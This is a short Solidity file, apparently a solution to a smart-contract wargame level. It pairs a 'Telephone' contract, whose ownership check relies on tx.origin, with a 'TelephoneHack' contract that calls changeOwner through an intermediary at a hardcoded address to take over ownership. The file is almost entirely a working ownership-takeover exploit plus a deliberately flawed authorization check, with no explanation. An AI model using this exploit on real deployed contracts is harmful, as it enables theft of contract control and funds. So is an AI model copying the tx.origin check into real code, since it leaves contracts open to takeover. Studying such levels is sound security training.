//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {

    address originalAdress = 0x7b2BE29b84761f435B993fD54CB917882Ad5d820;

    Telephone public originalContract = Telephone(originalAdress);

    function attack(address new_owner) public {

        originalContract.changeOwner(new_owner);
    }
}